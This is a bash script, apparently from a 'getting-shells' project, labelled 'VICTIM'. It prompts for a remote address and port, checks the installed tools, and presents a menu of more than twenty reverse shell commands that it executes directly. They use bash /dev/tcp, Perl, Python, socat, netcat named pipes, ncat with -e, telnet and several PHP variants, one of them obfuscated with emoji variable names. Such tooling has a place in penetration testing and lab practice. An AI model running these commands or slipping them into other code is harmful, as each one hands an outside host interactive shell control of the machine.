#!/bin/bash

#
# version 1
# date 2021-11-22
# https://github.com/davift/getting-shells
#

clear

allowAbort=true;
myInterruptHandler()
{
    if $allowAbort; then
        exit 1;
    fi;
}

trap myInterruptHandler SIGINT;

####

function box_out() {
  input_char=$(echo "$@" | wc -c)
  line=$(for i in `seq 0 $input_char`; do printf "─"; done)
  tput bold
  tput setaf 7
  space=${line//─/ }
  echo "┌${line}┐"
  printf '│ ' ; echo -n "$@"; printf "%s\n" ' │';
  echo "└${line}┘"
  tput sgr 0
}

function box_title() {
  tput bold
  tput setaf 6
  echo "┌───────────────────────────┐"
  echo "│                           │"
  echo "│  GETTING SHELLS - VICTIM  │"
  echo "│                           │"
  echo "└───────────────────────────┘"
  tput sgr0
}

function box_exited() {
  tput bold
  tput setaf 6
  echo "┌────────┐"
  echo "│ EXITED │"
  echo "└────────┘"
  tput sgr0
  exit 0
}

function box_red() {
#  tput bold
  tput setaf 1
  echo "$@"
  tput sgr0
}

function box_green() {
#  tput bold
  tput setaf 2
  echo "$@"
  tput sgr0
}

####

box_title;

if [ $1 ]; then
    remote_address=$1
else
    read -p "Remote address (RA) [IP or Name]? " remote_address
fi

if [ $(($2)) -ge 1 ]; then
    remote_port=$2
else
    read -p "Remote port (RP) [1-65535]? " remote_port
fi

tput bold
box_red "Remote listener $remote_address:$remote_port"

box_out "Testing..."

which nc > /dev/null && box_green "Original NetCat - OK" || box_red "Original NetCat (sudo apt install netcat -y)"
which ncat > /dev/null && box_green "NMAP's NetCat - OK" || box_red "NMAP's NetCat (sudo apt install ncat -y)"
which pwncat > /dev/null && box_green "PwnCat - OK" || box_red "PwnCat (pip install pwncat)"
which rustcat > /dev/null && box_green "RustCat - OK" || box_red "RustCat (curl -s https://raw.githubusercontent.com/robiot/rustcat/main/pkg/debian-install.sh | sudo bash)"
which bash > /dev/null && box_green "Bash - OK" || box_red "Bash (sudo apt install bash -y)"
which sh > /dev/null && box_green "Shell - OK" || box_red "Shell (Not installed!)"
which zsh > /dev/null && box_green "Zsh - OK" || box_red "Zsh (sudo apt install zsh -y)"
which perl > /dev/null && box_green "Perl - OK" || box_red "Perl (sudo apt install perl -y)"
which python3 > /dev/null && box_green "Python3 - OK" || box_red "Python3 (sudo apt install python3 -y)"
which php > /dev/null && box_green "PHP - OK" || box_red "PHP (sudo apt install php -y)"

box_out "Starting a reverse shell"

PS3='Selection: '
options=(
"Bash     | bash -i >& /dev/tcp/RA/RP 0>&1" \
"Shell    | sh -i >& /dev/tcp/RA/RP 0>&1" \
"ZShell   | zsh -c 'zmodload zsh/net/tcp && ztcp RA RP && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'" \
"Pearl    | perl -e 'use Socket;\$i=\"RA\";\$p=RP;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_at..." \
"Python3  | python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"RA\",RP));os.dup2(s.file..." \
"Python3  | export RHOST=\"RA\";export RPORT=RP;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RA\"),int(os.g..." \
"Python3  | python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"RA\",RP));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'" \
"Socat    | socat TCP:RA:RP EXEC:'sh',pty,stderr,setsid,sigint,sane" \
"Socat    | socat TCP:RA:RP EXEC:sh" \
"NetCat   | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc RA RP >/tmp/f" \
"NCat SSL | ncat --ssl -v RA RP -e /bin/bash" \
"Exec     | exec 5<>/dev/tcp/RA/RP;cat <&5 | while read line; do \$line 2>&5 >&5; done" \
"Exec     | 0<&196;exec 196<>/dev/tcp/RA/RP; sh <&196 >&196 2>&196" \
"PHP      | php -r '\$sock=fsockopen(\"RA\",RP);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" \
"PHP      | php -r '\$😀=\"1\";\$😁=\"2\";\$😅=\"3\";\$😆=\"4\";\$😉=\"5\";\$😊=\"6\";\$😎=\"7\";\$😍=\"8\";\$😚=\"9\";\$🙂=\"0\";\$🤢=\" \"..." \
"PHP      | php -r '\$sock=fsockopen(\"RA\",RP);exec(\"sh <&3 >&3 2>&3\");'" \
"PHP      | php -r '\$sock=fsockopen(\"RA\",RP);shell_exec(\"sh <&3 >&3 2>&3\");'" \
"PHP      | php -r '\$sock=fsockopen(\"RA\",RP);system(\"sh <&3 >&3 2>&3\");'" \
"PHP      | php -r '\$sock=fsockopen(\"RA\",RP);passthru(\"sh <&3 >&3 2>&3\");'" \
"PHP      | php -r '\$sock=fsockopen(\"RA\",RP);popen(\"sh <&3 >&3 2>&3\", \"r\");'" \
"PHP (BG) | php -r '\$sock=fsockopen(\"RA\",RP);\$proc=proc_open(\"sh\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'" \
"Telnet   | TF=\$(mktemp -u);mkfifo \$TF && telnet RA RP 0<\$TF | sh 1>\$TF" \
"EXIT")
select opt in "${options[@]}"
do
    case $opt in
        "${options[0]}")
            allowAbort=false;
            box_red "Starting session with Bash..."
            bash -i >& /dev/tcp/$remote_address/$remote_port 0>&1 || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[1]}")
            allowAbort=false;
            box_red "Starting session with Shell..."
            sh -i >& /dev/tcp/$remote_address/$remote_port 0>&1 || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[2]}")
            allowAbort=false;
            box_red "Starting session with ZShell..."
            zsh -c "zmodload zsh/net/tcp && ztcp $remote_address $remote_port && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[3]}")
            allowAbort=false;
            box_red "Starting session with Perl..."
            perl -e "use Socket;\$i=\"$remote_address\";\$p=$remote_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[4]}")
            allowAbort=false;
            box_red "Starting session with Python3..."
            python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$remote_address\",$remote_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[5]}")
            allowAbort=false;
            box_red "Starting session with Python3..."
            export RHOST="$remote_address";export RPORT=$remote_port;python3 -c "import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[6]}")
            allowAbort=false;
            box_red "Starting session with Python..."
            python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"$remote_address\",$remote_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[7]}")
            allowAbort=false;
            box_red "Starting session with Socat..."
            socat TCP:$remote_address:$remote_port EXEC:'sh',pty,stderr,setsid,sigint,sane || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[8]}")
            allowAbort=false;
            box_red "Starting session with Socat..."
            socat TCP:$remote_address:$remote_port EXEC:sh || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[9]}")
            allowAbort=false;
            box_red "Starting session with NetCat..."
            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $remote_address $remote_port >/tmp/f || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[10]}")
            allowAbort=false;
            box_red "Starting session with NetCat SSL..."
            ncat --ssl -v $remote_address $remote_port -e /bin/bash || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[11]}")
            allowAbort=false;
            box_red "Starting session with Exec..."
            0<&196;exec 196<>/dev/tcp/$remote_address/$remote_port; sh <&196 >&196 2>&196 || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[12]}")
            allowAbort=false;
            box_red "Starting session with Exec..."
            exec 5<>/dev/tcp/$remote_address/$remote_port;cat <&5 | while read line; do $line 2>&5 >&5; done || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[13]}")
            allowAbort=false;
            box_red "Starting session with PHP..."
            php -r "\$sock=fsockopen(\"$remote_address\",$remote_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[14]}")
            allowAbort=false;
            box_red "Starting session with PHP..."
            php -r "\$😀=\"1\";\$😁=\"2\";\$😅=\"3\";\$😆=\"4\";\$😉=\"5\";\$😊=\"6\";\$😎=\"7\";\$😍=\"8\";\$😚=\"9\";\$🙂=\"0\";\$🤢=\" \";\$🤓=\"<\";\$🤠=\">\";\$😱=\"-\";\$😵=\"&\";\$🤩=\"i\";\$🤔=\".\";\$🤨=\"/\";\$🥰=\"a\";\$😐=\"b\";\$😶=\"i\";\$🙄=\"h\";\$😂=\"c\";\$🤣=\"d\";\$😃=\"e\";\$😄=\"f\";\$😋=\"k\";\$😘=\"n\";\$😗=\"o\";\$😙=\"p\";\$🤗=\"s\";\$😑=\"x\";\$💀 = \$😄. \$🤗. \$😗. \$😂. \$😋. \$😗. \$😙. \$😃. \$😘;\$🚀 = \"$remote_address\";\$💻 = $remote_port;\$🐚 = \"sh\". \$🤢. \$😱. \$🤩. \$🤢. \$🤓. \$😵. \$😅. \$🤢. \$🤠. \$😵. \$😅. \$🤢. \$😁. \$🤠. \$😵. \$😅;\$🤣 = \$💀(\$🚀,\$💻);\$👽 = \$😃. \$😑. \$😃. \$😂;\$👽(\$🐚);" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[15]}")
            allowAbort=false;
            box_red "Starting session with PHP..."
            php -r "\$sock=fsockopen(\"$remote_address\",$remote_port);exec(\"sh <&3 >&3 2>&3\");" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[16]}")
            allowAbort=false;
            box_red "Starting session with PHP..."
            php -r "\$sock=fsockopen(\"$remote_address\",$remote_port);shell_exec(\"sh <&3 >&3 2>&3\");" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[17]}")
            allowAbort=false;
            box_red "Starting session with PHP..."
            php -r "\$sock=fsockopen(\"$remote_address\",$remote_port);system(\"sh <&3 >&3 2>&3\");" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[18]}")
            allowAbort=false;
            box_red "Starting session with PHP..."
            php -r "\$sock=fsockopen(\"$remote_address\",$remote_port);passthru(\"sh <&3 >&3 2>&3\");" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[19]}")
            allowAbort=false;
            box_red "Starting session with PHP..."
            php -r "\$sock=fsockopen(\"$remote_address\",$remote_port);popen(\"sh <&3 >&3 2>&3\", \"r\");" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[20]}")
            allowAbort=false;
            box_red "Starting session with PHP... in bachground!"
            php -r "\$sock=fsockopen(\"$remote_address\",$remote_port);\$proc=proc_open(\"sh\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);" || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[21]}")
            allowAbort=false;
            box_red "Starting session with Telnet..."
            TF=$(mktemp -u);mkfifo $TF && telnet $remote_address $remote_port 0<$TF | sh 1>$TF || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[22]}")
            break
            ;;
        *)
            echo "Unrecognized"
            ;;
    esac
done

box_exited;

exit 0
